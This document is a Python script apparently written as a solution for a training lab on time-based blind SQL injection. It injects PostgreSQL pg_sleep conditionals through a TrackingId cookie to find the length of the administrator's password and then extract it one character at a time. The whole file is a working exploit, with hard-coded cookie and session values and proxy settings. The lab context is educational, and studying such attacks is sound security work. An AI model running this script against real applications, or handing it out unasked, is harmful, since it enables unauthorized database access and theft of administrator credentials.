#Lab: Blind SQL injection with time delays and information retrieval
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        exploit(url,payload)
    except IndexError:
        print("[-] Usage %s <url> <payload> "%sys.argv[0])
        sys.exit(0)

def exploit(url,payload):

    print("[+] Finding the length of administrator password")
    pass_length=password_length(url,payload)
    if pass_length:
        print("[+] Found password length : "+str(pass_length))
        print("[+] Fetching password : ")
        password=fetch_password(url,payload,pass_length)
        if password:
            print('[+] Fetched password : '+password)
            sys.exit()
    
def password_length(url,payload):
    
    url=url+"filter?category=Gifts"
    
    for i in range(1,30):
        cookies={'TrackingId':'UfKlEsolko6y8oUa'+payload+' || (select case when length(password)=\''+str(i)+'\' then pg_sleep(10) end from users where username=\'administrator\') --'
                ,'session':'UKt01DVDWXfLiM0qoan8Om0ABSuQd4UV'}
    
        r=requests.get(url,verify=False,cookies=cookies,proxies=proxies)
        if int(r.elapsed.total_seconds())>= 10:
            break
    return i    

def fetch_password(url,payload,pass_length):
    url=url+"filter?category=Gifts"
    pass_chars=['a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                '0','1','2','3','4','5','6','7','8','9'
                ]
    password=''
    for i in range(1,pass_length+1):
        print("[+] Fetching character at position : "+str(i))
        for p in pass_chars:
            cookies={'TrackingId':'UfKlEsolko6y8oUa'+payload+' || (select case when substring(password,'+str(i)+',1)=\''+p+'\' then pg_sleep(10) end from users where username=\'administrator\')--',
                    'session':'UKt01DVDWXfLiM0qoan8Om0ABSuQd4UV'}
            r=requests.get(url,verify=False,cookies=cookies,proxies=proxies)
            if int(r.elapsed.total_seconds()) >=10:
                print('[+] Character at position '+str(i)+' : '+p)
                password+=p
                break
    return password            
if __name__=="__main__":
    main()